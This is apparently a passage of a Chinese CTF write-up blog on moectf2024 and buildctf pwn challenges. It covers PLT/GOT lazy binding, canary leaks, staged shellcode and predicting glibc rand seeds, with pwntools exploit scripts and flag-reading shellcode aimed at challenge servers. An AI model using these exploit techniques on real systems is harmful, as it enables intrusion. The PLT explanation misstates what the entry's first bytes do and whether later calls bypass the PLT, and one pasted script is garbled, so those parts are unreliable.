class="headerlink" title="这是什么？GOT！"></a><strong>这是什么？GOT！</strong></h1><p><mark>理解plt和got表之间的关系，已经函数真实地址是从哪里来的<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241015180637471.bmp"></p><blockquote><h3 id="调用过程解析"><a href="#调用过程解析" class="headerlink" title="调用过程解析"></a>调用过程解析</h3><ol><li><strong>程序启动时</strong>：<ul><li>当程序编译并链接时，外部库函数（如 <code>system</code>）的实际地址在编译期并不确定，尤其是动态链接库中的函数。为了处理这种不确定性，编译器生成了 <code>PLT</code>（Procedure Linkage Table，过程链接表）和 <code>GOT</code>（Global Offset Table，全球偏移表）。</li></ul></li><li><strong>第一次调用 <code>system</code> 时</strong>：<ul><li>当程序第一次调用 <code>system</code> 函数时，程序并不知道该函数的实际内存地址。所以，程序会先跳转到 <code>system@plt</code>，即位于 <code>PLT</code> 表中的 <code>system</code> 函数条目。</li><li>这个 <code>system@plt</code> 代码（你提到的 <code>.plt:0000000000401056</code> 的片段）会将某个索引值（<code>push 2</code>）压入栈，然后跳转到 <code>PLT</code> 的解析函数，也就是 <code>sub_401020</code>。这个解析函数会负责动态链接的符号解析。</li></ul></li><li><strong>动态链接器解析</strong>：<ul><li>当执行到 <code>sub_401020</code> 时，动态链接器会检查 <code>GOT</code> 表，看 <code>system</code> 函数的实际地址是否已经加载到 <code>GOT</code> 中。</li><li>如果 <code>GOT</code> 中还没有 <code>system</code> 的地址（这是第一次调用时的情况），动态链接器会调用 <code>ld.so</code> 来查找 <code>system</code> 函数的地址（比如从 libc.so 库中），并将这个地址填入 <code>GOT</code> 中。</li></ul></li><li>**后续调用 <code>system</code>**：<ul><li>一旦动态链接器找到了 <code>system</code> 函数的实际地址并将其写入到 <code>GOT</code> 表中，后续对 <code>system</code> 的调用将直接通过 <code>GOT</code> 表获取其地址，而不再经过 <code>system@plt</code> 进行跳转。这样可以提高性能，因为避免了每次调用时的跳转和解析。</li></ul></li></ol><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><strong>第一次调用 <code>system</code></strong> 时，会通过 <code>system@plt</code> 进行跳转和解析，因为程序还不知道 <code>system</code> 的实际地址。</li><li><strong>后续调用 <code>system</code></strong> 则会直接使用 <code>GOT</code> 表中缓存的地址，从而加快函数调用的速度。</li></ul><p>这个机制是动态链接库的一部分，目的是让程序在运行时动态解析函数地址，而不是在编译时就绑定函数地址。</p></blockquote><ul><li>在第一次调用system的时候，会去<code>0x401056</code>地址，而elf.plt[‘system’]是0x401050，下面理解一下为什么：</li></ul><blockquote><h3 id="PLT-机制概述"><a href="#PLT-机制概述" class="headerlink" title="PLT 机制概述"></a>PLT 机制概述</h3><p><code>PLT</code>（Procedure Linkage Table） 是 ELF 文件中的一个结构，用于延迟绑定动态链接库中的函数地址。每个动态函数（如 <code>system</code>）在 <code>PLT</code> 中有一个条目。这个条目主要包含两部分：</p><ol><li><p>PLT Entry</p><p>（</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system@plt</span><br></pre></td></tr></table></figure></div><p>）：</p><ul><li>每个函数在 <code>PLT</code> 中有一个入口，负责跳转到实际的函数实现。</li><li>第一次调用该函数时，入口会跳转到动态链接解析器来解析函数地址。</li></ul></li><li><p>PLT Stub</p><p>：</p><ul><li>每个函数的 <code>PLT</code> 条目包含一些指令，用来做跳转以及参数压栈等操作。</li><li>这些指令位于 <code>PLT</code> 中稍后的位置（通常会偏移几个字节）。</li></ul></li></ol><h3 id="具体情况：为什么跳到-0x401056-而不是-0x401050？"><a href="#具体情况：为什么跳到-0x401056-而不是-0x401050？" class="headerlink" title="具体情况：为什么跳到 0x401056 而不是 0x401050？"></a>具体情况：为什么跳到 <code>0x401056</code> 而不是 <code>0x401050</code>？</h3><p>在你的情况中，<code>PLT</code> 入口为 <code>0x401050</code>，但第一次调用实际跳转到了 <code>0x401056</code>，这是因为 <code>0x401050</code> 到 <code>0x401056</code> 之间是一个跳转指令的预留区域，而实际的指令从 <code>0x401056</code> 开始。以下是细节解释：</p><h4 id="汇编代码回顾："><a href="#汇编代码回顾：" class="headerlink" title="汇编代码回顾："></a>汇编代码回顾：</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">asm复制代码.plt:0000000000401050 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br><span class="line">.plt:0000000000401056 push    2</span><br><span class="line">.plt:000000000040105B jmp     sub_401020</span><br></pre></td></tr></table></figure></div><ul><li><code>0x401050</code> 是 <code>system@plt</code> 的条目起始地址，但它不是第一条实际执行的指令。</li><li>在 ELF 文件中，每个 <code>PLT</code> 条目可能会有一个跳转表格或者占位符，通常第一个几字节可能是与跳转无关的内容。</li><li>从 <code>0x401056</code> 开始，真正的指令才会执行:<ul><li><code>push 2</code>：将值 <code>2</code> 压入栈。这通常用于标识该 <code>PLT</code> 条目，表示它是 <code>system</code> 函数的第 2 个条目（索引 <code>2</code>），用于传递给链接解析器。</li><li><code>jmp sub_401020</code>：这是跳转到 <code>PLT</code> 的解析器函数，用于解析动态链接库中的函数地址。</li></ul></li></ul><h4 id="为什么是-0x401056？"><a href="#为什么是-0x401056？" class="headerlink" title="为什么是 0x401056？"></a>为什么是 <code>0x401056</code>？</h4><ul><li><strong>地址布局</strong>：<code>0x401050</code> 只是 <code>system@plt</code> 条目的起始地址。实际的指令从 <code>0x401056</code> 开始，因为 <code>0x401050</code> 到 <code>0x401056</code> 可能被填充为跳转表或用于其他目的（如预留空间）。</li><li><strong>跳转到指令的设计</strong>：ELF 文件和 <code>PLT</code> 的设计通常会在每个函数条目之间留有一些空间，使得跳转和解析可以分阶段进行。因此，<code>0x401056</code> 是 <code>system@plt</code> 中实际用于跳转和解析的指令起始点。</li></ul><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><ul><li><strong><code>0x401050</code></strong> 是 <code>system@plt</code> 的入口地址，但它可能只是一个占位符或跳转表的开始地址。</li><li><strong><code>0x401056</code></strong> 是 <code>system@plt</code> 条目中的实际指令起始地址，第一次调用 <code>system</code> 函数时跳转到了这里，因为这里包含了负责跳转和解析 <code>system</code> 函数地址的指令（如 <code>push 2</code> 和 <code>jmp sub_401020</code>）。</li></ul></blockquote><h1 id="Catch-the-canary"><a href="#Catch-the-canary" class="headerlink" title="Catch_the_canary!"></a>Catch_the_canary!</h1><p><mark>arc4random真随机数爆破<mark> : <a href="https://downbeat.top/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/">这篇文章</a></mark></mark></p><p><mark>跳过scanf的输入<mark></mark></mark></p><p><mark>泄露canary<mark></mark></mark></p><h2 id="下面看如何跳过scanf输入的"><a href="#下面看如何跳过scanf输入的" class="headerlink" title="下面看如何跳过scanf输入的"></a>下面看如何跳过scanf输入的</h2><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241015195948758.bmp"></p><ul><li>要求输入的不变，我们可以:</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>要求输入数字的时候，输入<span class="string">&#x27;+&#x27;</span> or <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    可以跳过输入</span><br></pre></td></tr></table></figure></div><ul><li><mark>泄露canary<mark></mark></mark></li></ul><p>利用<code>printf、puts</code>输出遇到\x00会截断和<code>canary</code>首字节是\x00来泄露canary</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只需填充canary的\x00，再利用printf将canary输出即可</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;Stop it!\n&quot;</span>)</span><br><span class="line">p.send(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;b&#x27;</span>)</span><br><span class="line">canary = <span class="string">b&#x27;\x00&#x27;</span>+p.recvn(<span class="number">7</span>) <span class="comment"># recvn(m)指定收到m字节</span></span><br></pre></td></tr></table></figure></div><h1 id="shellcode-revenge"><a href="#shellcode-revenge" class="headerlink" title="shellcode_revenge"></a><strong>shellcode_revenge</strong></h1><h2 id="有限字节shellcode再次调用read"><a href="#有限字节shellcode再次调用read" class="headerlink" title="有限字节shellcode再次调用read"></a><mark><strong>有限字节shellcode再次调用read</strong><mark></mark></mark></h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mmap((<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">50</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">read(<span class="number">0</span>, (<span class="type">void</span> *)<span class="number">0x20240000</span>, <span class="number">0xD</span>uLL);</span><br></pre></td></tr></table></figure></div><ul><li>很明显0xd字节写入shellcode长度是不够的，那么我们可以再次调用read,写入shellcode</li><li>为什么会想到<code>read</code>？观察执行shellcode前的寄存器，<code>rax=0</code>,只要<code>syscall</code>就会执行<code>read</code></li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241015215201688.bmp"></p><p><mark>注意其他几个寄存器<mark></mark></mark></p><p><img lazyload src="/images/loading.svg" data-src="/moectf2024%E7%9F%A5%E8%AF%86%E7%82%B9%E6%B1%87%E6%80%BB/capture_20241015215508725.bmp"></p><ul><li>因此在<code>syscall</code>之前还要修改rsi的值，因为我们往mmap地址写入了调用read的汇编代码</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov rdx , 100</span><br><span class="line">add rsi , 0xd # 这段汇编的长度是0xd</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure></div><ul><li>随后正常写入shellcode即可</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">addr = 0x20240000</span><br><span class="line">shellcode = shellcraft.open(&#x27;./flag&#x27;)</span><br><span class="line">shellcode += shellcraft.read(3,addr+0x100,0x100)</span><br><span class="line">shellcode += shellcraft.write(1,addr+0x100,0x100)</span><br></pre></td></tr></table></figure></div><h1 id="Pwn-it-off"><a href="#Pwn-it-off" class="headerlink" title="Pwn_it_off!"></a><strong>Pwn_it_off!</strong></h1><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p><mark>子函数栈结构的利用以及gdb调试<mark></mark></mark></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  beep();</span><br><span class="line">  voice_pwd();</span><br><span class="line">  num_pwd();</span><br><span class="line">  down();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>向上面这种结构，一旦输入超过栈空间就会影响到下面的函数，通过gdb动调可以明显发现</li></ul><h1 id="这是什么？32-bit！"><a href="#这是什么？32-bit！" class="headerlink" title="这是什么？32-bit！"></a><strong>这是什么？32-bit！</strong></h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getchar();</span><br><span class="line">__isoc99_scanf(<span class="string">&quot;%[^\n]s&quot;</span>, v1);</span><br></pre></td></tr></table></figure></div><ul><li>关键点就在于这两个函数</li><li><code>getchar()</code>用sendline填充</li><li><code>__isoc99_scanf(&quot;%[^\n]s&quot;, v1);</code>代表着无限长度输入</li></ul><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>随机数专题</title>
      <link href="/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/"/>
      <url>/2024/10/14/%E9%9A%8F%E6%9C%BA%E6%95%B0%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是伪随机？"><a href="#什么是伪随机？" class="headerlink" title="什么是伪随机？"></a>什么是伪随机？</h1><p>对于基本的随机数生成，比如说</p><div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">srand rand</span><br><span class="line">srandom random</span><br><span class="line"><span class="comment"># 位于stdlib头文件里面</span></span><br></pre></td></tr></table></figure></div><p>这两个函数的随机数生成都基于时间种子seed，通常来说，只要glibc相同，seed相同，那么所生成的随机数就是一样的。</p><h2 id="下面简单介绍一下随机数生产的代码"><a href="#下面简单介绍一下随机数生产的代码" class="headerlink" title="下面简单介绍一下随机数生产的代码"></a>下面简单介绍一下随机数生产的代码</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;the first random num is %d\n&quot;</span>,rand()%<span class="number">100</span>);</span><br><span class="line">srand(<span class="number">1</span>); </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;if the seed is 1 , the random num is %d\n&quot;</span>,rand()%<span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">the first random num is <span class="number">83</span></span><br><span class="line"><span class="keyword">if</span> the seed is <span class="number">1</span> , the random num is <span class="number">83</span></span><br></pre></td></tr></table></figure></div><ul><li><p><mark>srand(1)中的1代表随机数的种子(seed)<mark></mark></mark></p></li><li><p>第一个random num和第二次设置随机数种子为1所产生的随机数是一样的，代表着不设置随机数那么默认的随机数种子就是1</p></li></ul><h2 id="伪随机的利用"><a href="#伪随机的利用" class="headerlink" title="伪随机的利用"></a>伪随机的利用</h2><ul><li>下图是在Ubuntu22.04的情况下运行同样的代码(上面是在ubuntu24.04运行)</li></ul><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241014131824312.bmp"></p><p>可以发现产生的随机数是相同的，为什么呢？</p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241014131837873.bmp"></p><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241014131854890.bmp"></p><p><mark>我们发现虽然是在不同的ubuntu版本，即glibc版本不同的环境下运行，但是程序所利用的libc版本和ld版本相同，算法相同，他们所产生的随机数依旧是相同的，这就是伪随机的概念<mark></mark></mark></p><ul><li>所以我们只需要找到相同的libc就可以掌握随机数，但是我们写pwn的脚本是拿python写的，在python下如何模拟c语言产生随机数呢，<mark>ctype库<mark></mark></mark></li><li>下面展示基本的利用(<a href="http://downbeat.top/2024/09/21/%E4%BC%AA%E9%9A%8F%E6%9C%BA-%E7%88%86%E7%A0%B4canary-%E7%88%86%E7%A0%B4PIE/">这篇文章</a>提到过)</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>) <span class="comment"># 本地libc</span></span><br><span class="line">seed = libc.time(<span class="number">0</span>) <span class="comment"># 时间种子，0代表本地时间</span></span><br><span class="line">libc.srand(seed) </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    num = libc.rand() % <span class="number">50</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">srand 搭配 rand</span></span><br><span class="line"><span class="string">srandom 搭配 random</span></span><br><span class="line"><span class="string">前者安全性差</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure></div><p>基本的介绍就到这里，下面看几个例题吧：</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="srand-rand"><a href="#srand-rand" class="headerlink" title="srand&#x2F;rand"></a>srand&#x2F;rand</h2><p><a class="link" href="http://27.25.151.80:8000/games/2/challenges">题目链接 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>buildctf 你想成为沙威玛传奇吗</p><ul><li>主函数部分</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  initial(argc, argv, envp);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    fgets(num, <span class="number">4</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">switch</span> ( atoi(num) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        buy();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        eat();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        check();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        thief();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        beggar();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;go out&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>乍一看以为是堆题，但其实很简单。</p><ul><li>在eat函数中发现，只要Shawarma数量大于99就可以获得shell,而在beggar函数里面发现满足rand() &amp; 1&#x3D;&#x3D;0，就可以获得Shawarma。</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">eat</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_402190);</span><br><span class="line">  result = Shawarma;</span><br><span class="line">  <span class="keyword">if</span> ( Shawarma &gt; <span class="number">99</span> )</span><br><span class="line">    result = system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  Shawarma = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">beggar</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (rand() &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402244);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)--money;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_402260);</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)++Shawarma;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>x from pwn import *context(arch&#x3D;’amd64’,log_level&#x3D;’debug’)​#p &#x3D; process(“.&#x2F;pwn”)p &#x3D; remote(“challenge.basectf.fun”,30343)​def bug():    gdb.attach(p)    pause()​shellcode &#x3D; (‘’’    mov rax, 0x67616c662f2e     push rax    mov rsi, rsp    xor rax, rax    xor rdi, rdi    sub rdi, 100    xor rdx, rdx    mov r10, 7    mov rax, 0x101    syscall                    mov rdi,1    mov rsi,3       mov rdx,0    mov r10,0x100    push 40    pop rax    syscall ‘’’)​p.send(asm(shellcode))p.interactive()python</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initial</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v0 = time(<span class="number">0LL</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctype <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;27.25.151.80&quot;</span>,<span class="number">36122</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">seed = libc.time(<span class="number">0</span>)</span><br><span class="line">libc.srand(seed)</span><br><span class="line"></span><br><span class="line">cnt = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> (cnt &lt; <span class="number">100</span>):</span><br><span class="line">    p.recv()</span><br><span class="line">    num = libc.rand() &amp; <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">0</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line">        cnt += <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="srandom-localtime"><a href="#srandom-localtime" class="headerlink" title="srandom&#x2F;localtime"></a>srandom&#x2F;localtime</h2><p>题目：<code>moectf2024 这是什么？random!</code></p><ul><li>核心点</li></ul><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">timer = time(<span class="number">0LL</span>);</span><br><span class="line">v3 = localtime(&amp;timer);</span><br><span class="line">srandom(v3-&gt;tm_yday);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;Let&#x27;s play a number guessing game.&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> ( tests-- )</span><br><span class="line">&#123;</span><br><span class="line">  secret = random() % <span class="number">90000</span> + <span class="number">10000</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Guess a five-digit number I&#x27;m thinking of\n&gt; &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;guess);</span><br><span class="line">  <span class="keyword">if</span> ( guess != secret )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Wrong.&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wow, you are right!&quot;</span>);</span><br><span 